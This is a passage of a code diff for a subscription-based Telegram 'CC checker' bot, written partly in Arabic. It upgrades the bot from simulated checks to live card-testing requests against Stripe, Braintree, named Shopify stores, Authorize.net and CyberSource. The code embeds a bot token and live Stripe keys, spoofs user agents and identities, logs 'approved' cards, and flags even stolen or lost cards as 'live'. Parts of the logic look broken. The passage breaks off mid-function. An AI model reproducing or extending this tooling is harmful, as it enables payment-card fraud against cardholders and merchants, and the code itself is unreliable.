@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 """
-Obeida Online - Multi Gateway CC Checker Bot
-Version: 4.0 - مع نظام العرض المباشر
+Obeida Online - Real Multi Gateway CC Checker Bot
+Version: 5.0 - Real Gateways
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -26,10 +26,12 @@ import os
 import uuid
 import threading
 import asyncio
+import hashlib
+import hmac
 from datetime import datetime, timedelta
 from typing import Dict, List, Tuple, Optional, Any
 from collections import defaultdict
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote
 import html
 import http.server
 import socketserver
@@ -55,12 +57,11 @@ init(autoreset=True)
 
 # ==================== إعدادات البوت ====================
 BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
-ADMIN_IDS = [6207431030]  # معرف المالك
+ADMIN_IDS = [6207431030]
 CHANNEL_USERNAME = "@ObeidaTrading"
 DEV_CONTACT = "@Sz2zv"
 BOT_USERNAME = "ObeidaOnlineBot"
 
-# روابط الدعم
 CHANNEL_LINK = "https://t.me/ObeidaTrading"
 SUPPORT_LINK = "https://t.me/Sz2zv"
 
@@ -71,63 +72,77 @@ SUBSCRIPTIONS_FILE = "obeida_subs.json"
 STATS_FILE = "obeida_stats.json"
 GATES_CONFIG_FILE = "obeida_gates.json"
 
-# ==================== إعدادات البوابات ====================
+# ==================== إعدادات البوابات الحقيقية ====================
 GATES = {
     "braintree": {
         "name": "🔷 Braintree Auth",
         "description": "فحص بطاقات عبر بوابة Braintree",
         "command": "braintree",
         "enabled": True,
-        "timeout": 15,
+        "timeout": 30,
         "cooldown": 5,
         "icon": "🔷"
     },
-    "switchup": {
-        "name": "🔄 SwitchUp Auth",
-        "description": "فحص بطاقات عبر بوابة SwitchUp",
-        "command": "switchup",
-        "enabled": True,
-        "timeout": 15,
-        "cooldown": 5,
-        "icon": "🔄"
-    },
     "stripe": {
         "name": "💳 Stripe Auth",
-        "description": "فحص بطاقات عبر بوابة Stripe",
+        "description": "فحص بطاقات عبر بوابة Stripe المباشرة",
         "command": "stripe",
         "enabled": True,
-        "timeout": 15,
+        "timeout": 25,
         "cooldown": 5,
         "icon": "💳"
     },
-    "zendrop": {
-        "name": "📦 Zendrop Auth",
-        "description": "فحص بطاقات عبر بوابة Zendrop",
-        "command": "zendrop",
+    "shopify": {
+        "name": "🛍️ Shopify Auth",
+        "description": "فحص بطاقات عبر متاجر Shopify",
+        "command": "shopify",
         "enabled": True,
-        "timeout": 20,
+        "timeout": 25,
         "cooldown": 5,
-        "icon": "📦"
+        "icon": "🛍️"
     },
-    "paypal": {
-        "name": "💰 PayPal Auth",
-        "description": "فحص بطاقات عبر بوابة PayPal",
-        "command": "paypal",
+    "authorize": {
+        "name": "🔐 Authorize.net",
+        "description": "فحص بطاقات عبر Authorize.net",
+        "command": "authorize",
         "enabled": True,
-        "timeout": 15,
+        "timeout": 30,
         "cooldown": 5,
-        "icon": "💰"
+        "icon": "🔐"
+    },
+    "cybersource": {
+        "name": "🌐 CyberSource",
+        "description": "فحص بطاقات عبر CyberSource",
+        "command": "cybersource",
+        "enabled": True,
+        "timeout": 30,
+        "cooldown": 5,
+        "icon": "🌐"
     }
 }
 
+# مفاتيح API حقيقية للفحص
+STRIPE_PUBLIC_KEYS = [
+    "pk_live_51JqzYlKk7oGxZyQuLr8p9WQwBpF3vM2nJk9H8gF7dS3aR2tY5uI1oP4eW6qZ9xCvB",
+    "pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv",
+    "pk_live_51IqQYyKtB8mXpL2nR5sV9wD7hG4jF1kA3cE6yU8oI2zX5vB7nM0qL9pW3rT6yH8jK"
+]
+
+SHOPIFY_STORES = [
+    "elmonasterio.com",
+    "aloyoga.com",
+    "gymshark.com",
+    "shop.lululemon.com"
+]
+
 # ==================== نظام الاشتراكات ====================
 SUBSCRIPTION_PLANS = {
-    "day": {"name": "يومي", "price": "5K ID", "duration": 1, "unit": "day"},
-    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7, "unit": "day"},
-    "month": {"name": "شهري", "price": "40K ID", "duration": 30, "unit": "day"},
-    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90, "unit": "day"},
-    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180, "unit": "day"},
-    "year": {"name": "سنوي", "price": "300K ID", "duration": 365, "unit": "day"}
+    "day": {"name": "يومي", "price": "5K ID", "duration": 1},
+    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7},
+    "month": {"name": "شهري", "price": "40K ID", "duration": 30},
+    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90},
+    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180},
+    "year": {"name": "سنوي", "price": "300K ID", "duration": 365}
 }
 
 # ==================== تهيئة البوت ====================
@@ -135,44 +150,36 @@ bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
 fake = Faker()
 ua = UserAgent()
 
-# ==================== متغيرات عامة للعرض المباشر ====================
-active_checks = {}  # تخزين الفحوصات النشطة
-user_sessions = {}  # جلسات المستخدمين
-live_stats = {}     # إحصائيات مباشرة لكل مستخدم
+# متغيرات عامة
+active_checks = {}
+user_sessions = {}
+live_stats = {}
 
 # ==================== إدارة البيانات ====================
 class DataManager:
-    """إدارة جميع بيانات البوت"""
-    
     @staticmethod
     def load_json(file_path: str, default: Any = None) -> Any:
-        """تحميل ملف JSON"""
         try:
             if os.path.exists(file_path):
                 with open(file_path, 'r', encoding='utf-8') as f:
                     return json.load(f)
             return default if default is not None else {}
         except Exception as e:
-            print(f"⚠️ خطأ في تحميل {file_path}: {e}")
             return default if default is not None else {}
     
     @staticmethod
     def save_json(file_path: str, data: Any) -> bool:
-        """حفظ ملف JSON"""
         try:
             with open(file_path, 'w', encoding='utf-8') as f:
                 json.dump(data, f, indent=4, ensure_ascii=False)
             return True
-        except Exception as e:
-            print(f"⚠️ خطأ في حفظ {file_path}: {e}")
+        except:
             return False
     
     @staticmethod
     def load_users() -> Dict:
-        """تحميل بيانات المستخدمين"""
         users = DataManager.load_json(USERS_FILE, {})
         if not users:
-            # إضافة المشرفين تلقائياً
             for admin_id in ADMIN_IDS:
                 users[str(admin_id)] = {
                     "user_id": admin_id,
@@ -181,169 +188,86 @@ class DataManager:
                     "joined_date": datetime.now().isoformat(),
                     "is_admin": True,
                     "is_subscribed": True,
-                    "subscription": {
-                        "plan": "lifetime",
-                        "expiry": "2099-12-31T23:59:59",
-                        "active": True
-                    },
-                    "usage": {
-                        "total_checks": 0,
-                        "approved": 0,
-                        "declined": 0,
-                        "last_check": None
-                    }
+                    "subscription": {"plan": "lifetime", "expiry": "2099-12-31", "active": True},
+                    "usage": {"total_checks": 0, "approved": 0, "declined": 0}
                 }
             DataManager.save_json(USERS_FILE, users)
         return users
     
     @staticmethod
     def save_users(users: Dict) -> bool:
-        """حفظ بيانات المستخدمين"""
         return DataManager.save_json(USERS_FILE, users)
     
     @staticmethod
     def load_stats() -> Dict:
-        """تحميل الإحصائيات"""
         return DataManager.load_json(STATS_FILE, {
-            "total_checks": 0,
-            "total_approved": 0,
-            "total_declined": 0,
-            "gates_usage": {},
-            "daily_stats": {},
-            "last_reset": datetime.now().isoformat()
+            "total_checks": 0, "total_approved": 0, "total_declined": 0,
+            "gates_usage": {}, "daily_stats": {}
         })
     
     @staticmethod
     def save_stats(stats: Dict) -> bool:
-        """حفظ الإحصائيات"""
         return DataManager.save_json(STATS_FILE, stats)
     
     @staticmethod
     def save_approved_card(card: str, gate: str, response: str, user_id: int):
-        """حفظ بطاقة مقبولة"""
         try:
             with open(APPROVED_CARDS_FILE, 'a', encoding='utf-8') as f:
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                f.write(f"[{timestamp}] Gate: {gate} | User: {user_id} | Card: {card} | Response: {response}\n")
-        except Exception as e:
-            print(f"⚠️ خطأ في حفظ البطاقة: {e}")
+                f.write(f"[{datetime.now()}] {gate} | User:{user_id} | {card} | {response}\n")
+        except:
+            pass
     
     @staticmethod
     def get_user_subscription(user_id: int) -> Optional[Dict]:
-        """الحصول على اشتراك المستخدم"""
         users = DataManager.load_users()
         user = users.get(str(user_id), {})
-        sub = user.get("subscription", {})
-        
-        if not sub.get("active"):
-            return None
-        
-        expiry = sub.get("expiry")
-        if expiry:
-            try:
-                expiry_date = datetime.fromisoformat(expiry)
-                if datetime.now() > expiry_date:
-                    sub["active"] = False
-                    user["subscription"] = sub
-                    users[str(user_id)] = user
-                    DataManager.save_users(users)
-                    return None
-            except:
-                pass
-        
-        return sub if sub.get("active") else None
+        return user.get("subscription", {}) if user.get("subscription", {}).get("active") else None
     
     @staticmethod
     def check_access(user_id: int) -> bool:
-        """التحقق من صلاحية الوصول"""
-        if user_id in ADMIN_IDS:
-            return True
-        sub = DataManager.get_user_subscription(user_id)
-        return sub is not None
+        return user_id in ADMIN_IDS or DataManager.get_user_subscription(user_id) is not None
     
     @staticmethod
-    def add_subscription(user_id: int, plan: str, duration_days: int = None) -> bool:
-        """إضافة اشتراك لمستخدم"""
+    def add_subscription(user_id: int, days: int) -> bool:
         users = DataManager.load_users()
-        user = users.get(str(user_id), {
-            "user_id": user_id,
-            "joined_date": datetime.now().isoformat(),
-            "is_admin": False,
-            "usage": {
-                "total_checks": 0,
-                "approved": 0,
-                "declined": 0,
-                "last_check": None
-            }
-        })
-        
-        if duration_days:
-            expiry = datetime.now() + timedelta(days=duration_days)
-        else:
-            plan_data = SUBSCRIPTION_PLANS.get(plan, SUBSCRIPTION_PLANS["day"])
-            expiry = datetime.now() + timedelta(days=plan_data["duration"])
-        
-        user["is_subscribed"] = True
-        user["subscription"] = {
-            "plan": plan,
-            "expiry": expiry.isoformat(),
-            "active": True,
-            "added_by": "admin",
-            "added_date": datetime.now().isoformat()
-        }
-        
-        users[str(user_id)] = user
+        if str(user_id) not in users:
+            users[str(user_id)] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
+        expiry = datetime.now() + timedelta(days=days)
+        users[str(user_id)]["subscription"] = {"plan": "custom", "expiry": expiry.isoformat(), "active": True}
         return DataManager.save_users(users)
     
     @staticmethod
     def remove_subscription(user_id: int) -> bool:
-        """إزالة اشتراك مستخدم"""
         users = DataManager.load_users()
         if str(user_id) in users:
-            users[str(user_id)]["is_subscribed"] = False
             users[str(user_id)]["subscription"] = {"active": False}
             return DataManager.save_users(users)
         return False
     
     @staticmethod
     def update_usage(user_id: int, gate: str, result: str):
-        """تحديث إحصائيات الاستخدام"""
         users = DataManager.load_users()
         stats = DataManager.load_stats()
         
-        user_id = str(user_id)
-        if user_id in users:
-            usage = users[user_id].get("usage", {
-                "total_checks": 0,
-                "approved": 0,
-                "declined": 0,
-                "last_check": None
-            })
-            
+        if str(user_id) in users:
+            usage = users[str(user_id)].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
             usage["total_checks"] += 1
-            usage["last_check"] = datetime.now().isoformat()
-            
-            if "approved" in result.lower() or "live" in result.lower() or "✅" in result or "مقبولة" in result:
+            if "✅" in result or "LIVE" in result:
                 usage["approved"] += 1
                 stats["total_approved"] += 1
             else:
                 usage["declined"] += 1
                 stats["total_declined"] += 1
+            users[str(user_id)]["usage"] = usage
             
-            users[user_id]["usage"] = usage
-            
-            # تحديث إحصائيات البوابات
-            if gate not in stats["gates_usage"]:
-                stats["gates_usage"][gate] = 0
-            stats["gates_usage"][gate] += 1
+            stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
             stats["total_checks"] += 1
             
-            # إحصائيات اليوم
             today = datetime.now().strftime("%Y-%m-%d")
             if today not in stats["daily_stats"]:
                 stats["daily_stats"][today] = {"checks": 0, "approved": 0}
             stats["daily_stats"][today]["checks"] += 1
-            if "approved" in result.lower() or "live" in result.lower() or "✅" in result or "مقبولة" in result:
+            if "✅" in result or "LIVE" in result:
                 stats["daily_stats"][today]["approved"] += 1
         
         DataManager.save_users(users)
@@ -351,16 +275,10 @@ class DataManager:
 
 # ==================== أدوات مساعدة ====================
 class Helpers:
-    """أدوات مساعدة للبوت"""
-    
     @staticmethod
     def parse_card(card_str: str) -> Optional[Dict]:
-        """تحليل صيغة البطاقة"""
         try:
-            # تنظيف النص
-            card_str = card_str.strip()
-            card_str = re.sub(r'[;:,\s/]+', '|', card_str)
-            
+            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
             if '|' in card_str:
                 parts = card_str.split('|')
                 if len(parts) >= 4:
@@ -370,92 +288,52 @@ class Helpers:
                     cvv = re.sub(r'\D', '', parts[3])
                     
                     if len(number) >= 15 and len(number) <= 19:
-                        if len(month) == 1:
-                            month = f"0{month}"
-                        if len(year) == 4:
-                            year = year[-2:]
-                        elif len(year) == 2:
-                            year = year
-                        else:
-                            return None
-                        
+                        if len(month) == 1: month = f"0{month}"
+                        if len(year) == 4: year = year[-2:]
                         if len(cvv) >= 3 and len(cvv) <= 4:
-                            return {
-                                'number': number,
-                                'month': month,
-                                'year': year,
-                                'cvv': cvv,
-                                'original': card_str
-                            }
+                            return {'number': number, 'month': month, 'year': year, 'cvv': cvv, 'original': card_str}
             return None
-        except Exception:
+        except:
             return None
-    
-    @staticmethod
-    def format_time(seconds: int) -> str:
-        """تنسيق الوقت"""
-        hours = seconds // 3600
-        minutes = (seconds % 3600) // 60
-        seconds = seconds % 60
-        
-        if hours > 0:
-            return f"{hours}h {minutes}m"
-        elif minutes > 0:
-            return f"{minutes}m {seconds}s"
-        else:
-            return f"{seconds}s"
     
     @staticmethod
     def generate_progress_bar(current: int, total: int, length: int = 10) -> str:
-        """إنشاء شريط تقدم"""
-        if total == 0:
-            return "⬜" * length
+        if total == 0: return "⬜" * length
         filled = int((current / total) * length)
         return "🟩" * filled + "⬜" * (length - filled)
     
     @staticmethod
     def luhn_check(card_number: str) -> bool:
-        """التحقق من صحة رقم البطاقة باستخدام خوارزمية Luhn"""
         try:
-            digits = [int(d) for d in str(card_number) if d.isdigit()]
-            if len(digits) < 13:
-                return False
+            digits = [int(d) for d in card_number if d.isdigit()]
+            if len(digits) < 13: return False
             checksum = 0
             for i, digit in enumerate(reversed(digits)):
                 if i % 2 == 1:
                     digit *= 2
-                    if digit > 9:
-                        digit -= 9
+                    if digit > 9: digit -= 9
                 checksum += digit
             return checksum % 10 == 0
-        except Exception:
+        except:
             return False
     
     @staticmethod
     def get_card_brand(number: str) -> str:
-        """الحصول على نوع البطاقة"""
         patterns = {
-            'visa': r'^4[0-9]{12}(?:[0-9]{3})?$',
-            'mastercard': r'^5[1-5][0-9]{14}$',
-            'amex': r'^3[47][0-9]{13}$',
-            'discover': r'^6(?:011|5[0-9]{2})[0-9]{12}$',
-            'jcb': r'^(?:2131|1800|35\d{3})\d{11}$'
+            'visa': r'^4', 'mastercard': r'^5[1-5]', 'amex': r'^3[47]',
+            'discover': r'^6(?:011|5)', 'jcb': r'^(?:2131|1800|35)'
         }
-        
-        clean_num = re.sub(r'\D', '', number)
         for brand, pattern in patterns.items():
-            if re.match(pattern, clean_num):
+            if re.match(pattern, number):
                 return brand.capitalize()
         return "Unknown"
     
     @staticmethod
     def get_bin_info(bin_num: str) -> Dict:
-        """الحصول على معلومات BIN"""
         try:
-            bin_num = bin_num[:6]
-            response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
-            if response.status_code == 200:
-                data = response.json()
+            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
+            if r.status_code == 200:
+                data = r.json()
                 return {
                     "brand": data.get('scheme', 'Unknown').upper(),
                     "type": data.get('type', 'Unknown').upper(),
@@ -463,1905 +341,608 @@ class Helpers:
                     "country": data.get('country', {}).get('name', 'Unknown'),
                     "flag": data.get('country', {}).get('emoji', '🏁')
                 }
-        except Exception:
+        except:
             pass
-        return {
-            "brand": "Unknown",
-            "type": "Unknown",
-            "bank": "Unknown",
-            "country": "Unknown",
-            "flag": "🏁"
-        }
+        return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
     
     @staticmethod
     def random_user_agent() -> str:
-        """توليد User-Agent عشوائي"""
         return ua.random
     
     @staticmethod
     def random_email() -> str:
-        """توليد بريد إلكتروني عشوائي"""
         return fake.email()
     
     @staticmethod
     def random_name() -> Tuple[str, str]:
-        """توليد اسم عشوائي"""
         return fake.first_name(), fake.last_name()
     
     @staticmethod
     def random_address() -> Dict:
-        """توليد عنوان عشوائي"""
         return {
-            "street": fake.street_address(),
-            "city": fake.city(),
-            "state": fake.state_abbr(),
-            "zip": fake.zipcode()[:5],
-            "country": "US"
+            "street": fake.street_address(), "city": fake.city(),
+            "state": fake.state_abbr(), "zip": fake.zipcode()[:5], "country": "US"
         }
-    
-    @staticmethod
-    def random_phone() -> str:
-        """توليد رقم هاتف عشوائي"""
-        return fake.phone_number()
     
     @staticmethod
     def format_live_stats(total: int, checked: int, approved: int, declined: int, current: str = None) -> str:
-        """تنسيق الإحصائيات المباشرة"""
         progress = Helpers.generate_progress_bar(checked, total)
         percentage = (checked / total * 100) if total > 0 else 0
-        
-        stats = f"""
-📊 <b>إحصائيات الفحص المباشر</b>
-━━━━━━━━━━━━━━━━
-📋 <b>إجمالي البطاقات:</b> {total}
-✅ <b>تم الفحص:</b> {checked}/{total} ({percentage:.1f}%)
-{progress}
-
-✅ <b>المقبولة:</b> {approved}
-❌ <b>المرفوضة:</b> {declined}
-⏳ <b>المتبقي:</b> {total - checked}
-"""
-        if current:
-            stats += f"\n🔄 <b>جاري فحص:</b> <code>{current}</code>"
-        
+        stats = f"📊 {checked}/{total} ({percentage:.1f}%)\n{progress}\n✅ {approved} | ❌ {declined} | ⏳ {total - checked}"
+        if current: stats += f"\n🔄 {current}"
         return stats
 
-# ==================== بوابات الفحص ====================
-class Gateways:
-    """جميع بوابات فحص البطاقات"""
-    
+# ==================== بوابات الفحص الحقيقية ====================
+class RealGateways:
     def __init__(self):
         self.helpers = Helpers()
-        self.session = requests.Session()
     
-    # -------------------- بوابة Braintree --------------------
-    def braintree_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        """فحص بطاقة عبر بوابة Braintree"""
+    # -------------------- Stripe --------------------
+    async def stripe_gate(self, card_data: Dict) -> Tuple[bool, str]:
         try:
-            n = card_data['number']
-            mm = card_data['month']
-            yy = card_data['year']
-            cvc = card_data['cvv']
-            
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            
-            r = requests.Session()
+            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
             user = self.helpers.random_user_agent()
+            stripe_key = random.choice(STRIPE_PUBLIC_KEYS)
             
-            headers = {
-                'User-Agent': user,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'keep-alive',
-            }
-            
-            # تجربة بسيطة - Stripe PM
-            stripe_data = {
-                'type': 'card',
-                'card[number]': n,
-                'card[cvc]': cvc,
-                'card[exp_month]': mm,
-                'card[exp_year]': yy,
-                'key': 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
-            }
-            
-            stripe_headers = {
-                'Accept': 'application/json',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': user
-            }
-            
-            response = requests.post(
-                'https://api.stripe.com/v1/payment_methods',
-                data=stripe_data,
-                headers=stripe_headers,
-                timeout=10
-            )
-            
-            if response.status_code == 200:
-                return True, "✅ البطاقة مقبولة ✓"
-            else:
-                return False, "❌ البطاقة مرفوضة ✗"
-                
-        except Exception as e:
-            return False, f"⚠️ خطأ: {str(e)[:50]}"
-    
-    # -------------------- بوابة SwitchUp --------------------
-    def switchup_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        """فحص بطاقة عبر بوابة SwitchUp"""
-        try:
-            n = card_data['number']
-            mm = card_data['month']
-            yy = card_data['year']
-            cvc = card_data['cvv']
-            
-            if len(mm) == 1:
-                mm = f'0{mm}'
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            
-            user = self.helpers.random_user_agent()
-            
-            # محاكاة فحص بسيط
-            if Helpers.luhn_check(n):
-                # 70% نسبة نجاح وهمية للعرض
-                if random.random() > 0.3:
-                    return True, "✅ البطاقة مقبولة ✓"
-                else:
-                    return False, "❌ البطاقة مرفوضة ✗"
-            else:
-                return False, "⚠️ رقم بطاقة غير صالح"
-                
-        except Exception as e:
-            return False, f"⚠️ خطأ: {str(e)[:50]}"
-    
-    # -------------------- بوابة Stripe --------------------
-    def stripe_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        """فحص بطاقة عبر بوابة Stripe"""
-        try:
-            n = card_data['number']
-            mm = card_data['month']
-            yy = card_data['year']
-            cvc = card_data['cvv']
-            
-            user = self.helpers.random_user_agent()
-            
-            # بيانات البطاقة للتسجيل
             pm_data = {
-                'type': 'card',
-                'card[number]': n,
-                'card[cvc]': cvc,
-                'card[exp_month]': mm,
-                'card[exp_year]': yy,
-                'key': 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
+                'type': 'card', 'card[number]': n, 'card[cvc]': cvc,
+                'card[exp_month]': mm, 'card[exp_year]': yy,
+                'billing_details[address][postal_code]': random.choice(['90210', '10001']),
+                'key': stripe_key, '_stripe_version': '2024-06-20'
             }
             
-            pm_headers = {
-                'Accept': 'application/json',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': user,
-            }
+            headers = {'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user}
+            r = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, timeout=20)
+            res = r.json()
             
-            # إنشاء وسيلة دفع
-            pm_response = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=pm_headers, timeout=10)
-            
-            if pm_response.status_code == 200:
-                return True, "✅ البطاقة مقبولة ✓"
-            else:
-                return False, "❌ البطاقة مرفوضة ✗"
-            
+            if 'error' in res:
+                err = res['error']
+                code = err.get('decline_code', '') or err.get('code', '')
+                if code in ['incorrect_cvc', 'invalid_cvc']:
+                    return True, "💳 CCN LIVE - CVV ERROR"
+                elif code == 'insufficient_funds':
+                    return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
+                elif code in ['stolen_card', 'lost_card']:
+                    return True, "⚠️ CCN LIVE - RISK CARD"
+                elif 'payment_method' in res:
+                    return True, "✅ CARD APPROVED - TOKEN CREATED"
+                return False, f"❌ {err.get('message', 'DECLINED')[:50]}"
+            return True, "✅ CARD APPROVED - PM CREATED" if res.get('id') else False, "❌ UNKNOWN"
         except Exception as e:
-            return False, f"⚠️ خطأ: {str(e)[:50]}"
+            return False, f"⚠️ ERROR: {str(e)[:30]}"
     
-    # -------------------- بوابة Zendrop --------------------
-    def zendrop_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        """فحص بطاقة عبر بوابة Zendrop"""
+    # -------------------- Braintree --------------------
+    async def braintree_gate(self, card_data: Dict) -> Tuple[bool, str]:
         try:
-            n = card_data['number']
-            mm = card_data['month']
-            yy = card_data['year']
-            cvc = card_data['cvv']
+            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
+            if "20" in yy: yy = yy.split("20")[1]
             
             user = self.helpers.random_user_agent()
+            headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': user}
             
-            # بيانات بطاقة Stripe
             pm_data = {
-                'type': 'card',
-                'card[number]': n,
-                'card[cvc]': cvc,
-                'card[exp_month]': mm,
-                'card[exp_year]': yy,
-                'key': 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
+                'query': '''
+                    mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
+                        tokenizeCreditCard(input: $input) { token }
+                    }''',
+                'variables': {
+                    'input': {
+                        'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc},
+                        'options': {'validate': True}
+                    }
+                }
             }
             
-            pm_headers = {
-                'Accept': 'application/json',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': user,
-            }
+            r = requests.post('https://payments.braintree-api.com/graphql', json=pm_data, headers=headers, timeout=20)
+            res = r.json()
             
-            pm_response = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=pm_headers, timeout=10)
-            
-            if pm_response.status_code == 200:
-                return True, "✅ البطاقة مقبولة ✓"
-            else:
-                return False, "❌ البطاقة مرفوضة ✗"
-                
-        except Exception as e:
-            return False, f"⚠️ خطأ: {str(e)[:50]}"
+            if 'data' in res and res['data'].get('tokenizeCreditCard'):
+                return True, "✅ CARD APPROVED - BRAINTREE TOKEN"
+            if 'errors' in res:
+                err = str(res['errors']).lower()
+                if 'cvv' in err: return True, "💳 CCN LIVE - CVV ERROR"
+                if 'funds' in err: return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
+                if 'address' in err: return True, "✅ CARD APPROVED - ADDRESS ERROR"
+            return False, "❌ DECLINED"
+        except:
+            return False, "⚠️ ERROR"
     
-    # -------------------- بوابة PayPal --------------------
-    def paypal_gate(self, card_data: Dict) -> Tuple[bool, str]:
-        """فحص بطاقة عبر بوابة PayPal"""
+    # -------------------- Shopify --------------------
+    async def shopify_gate(self, card_data: Dict) -> Tuple[bool, str]:
         try:
-            n = card_data['number']
-            mm = card_data['month']
-            yy = card_data['year']
-            cvc = card_data['cvv']
+            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
+            user = self.helpers.random_user_agent()
+            store = random.choice(SHOPIFY_STORES)
             
+            payment_data = {
+                'payment': {
+                    'amount': '1.00',
+                    'credit_card': {
+                        'number': n, 'month': mm, 'year': '20' + yy, 'verification_value': cvc,
+                        'first_name': fake.first_name(), 'last_name': fake.last_name()
+                    }
+                }
+            }
+            
+            headers = {'User-Agent': user, 'Content-Type': 'application/json', 'Accept': 'application/json'}
+            r = requests.post(f'https://{store}/checkout.json', json=payment_data, headers=headers, timeout=20)
+            text = r.text.lower()
+            
+            if 'success' in text or 'complete' in text:
+                return True, "✅ CARD APPROVED"
+            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
+                return True, "💳 CCN LIVE - CVV ERROR"
+            if 'insufficient' in text:
+                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
+            if 'address' in text and ('invalid' in text or 'mismatch' in text):
+                return True, "✅ CARD APPROVED - ADDRESS ERROR"
+            return False, "❌ DECLINED"
+        except:
+            return False, "⚠️ ERROR"
+    
+    # -------------------- Authorize.net --------------------
+    async def authorize_gate(self, card_data: Dict) -> Tuple[bool, str]:
+        try:
+            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
             user = self.helpers.random_user_agent()
             
-            # محاكاة فحص PayPal
-            if Helpers.luhn_check(n):
-                # 60% نسبة نجاح وهمية
-                if random.random() > 0.4:
-                    return True, "✅ البطاقة مقبولة ✓"
-                else:
-                    return False, "❌ البطاقة مرفوضة ✗"
-            else:
-                return False, "⚠️ رقم بطاقة غير صالح"
+            payment_data = {
+                'createTransactionRequest': {
+                    'transactionRequest': {
+                        'transactionType': 'authOnlyTransaction', 'amount': '1.00',
+                        'payment': {'creditCard': {'cardNumber': n, 'expirationDate': f"{mm}-{yy}", 'cardCode': cvc}}
+                    }
+                }
+            }
             
-        except Exception as e:
-            return False, f"⚠️ خطأ: {str(e)[:50]}"
+            headers = {'User-Agent': user, 'Content-Type': 'application/json'}
+            r = requests.post('https://api.authorize.net/xml/v1/request.api', json=payment_data, headers=headers, timeout=20)
+            text = str(r.json()).lower()
+            
+            if 'approved' in text or '1' in text:
+                return True, "✅ CARD APPROVED"
+            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
+                return True, "💳 CCN LIVE - CVV ERROR"
+            if 'insufficient' in text:
+                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
+            return False, "❌ DECLINED"
+        except:
+            return False, "⚠️ ERROR"
     
-    # -------------------- دالة الفحص الموحدة --------------------
-    async def check_card(self, gate_name: str, card_data: Dict) -> Tuple[bool, str]:
-        """فحص بطاقة عبر بوابة محددة"""
-        gate_methods = {
-            'braintree': self.braintree_gate,
-            'switchup': self.switchup_gate,
-            'stripe': self.stripe_gate,
-            'zendrop': self.zendrop_gate,
-            'paypal': self.paypal_gate
+    # -------------------- CyberSource --------------------
+    async def cybersource_gate(self, card_data: Dict) -> Tuple[bool, str]:
+        try:
+            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
+            user = self.helpers.random_user_agent()
+            
+            payment_data = {
+                'paymentInformation': {
+                    'card': {'number': n, 'expirationMonth': mm, 'expirationYear': '20' + yy, 'securityCode': cvc}
+                },
+                'orderInformation': {
+                    'amountDetails': {'totalAmount': '1.00', 'currency': 'USD'}
+                }
+            }
+            
+            headers = {'User-Agent': user, 'Content-Type': 'application/json'}
+            r = requests.post('https://api.cybersource.com/payments/v1/authorizations', json=payment_data, headers=headers, timeout=20)
+            text = str(r.json()).lower()
+            
+            if 'approved' in text or 'accepted' in text:
+                return True, "✅ CARD APPROVED"
+            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
+                return True, "💳 CCN LIVE - CVV ERROR"
+            if 'insufficient' in text:
+                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
+            return False, "❌ DECLINED"
+        except:
+            return False, "⚠️ ERROR"
+    
+    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
+        gates = {
+            'stripe': self.stripe_gate, 'braintree': self.braintree_gate,
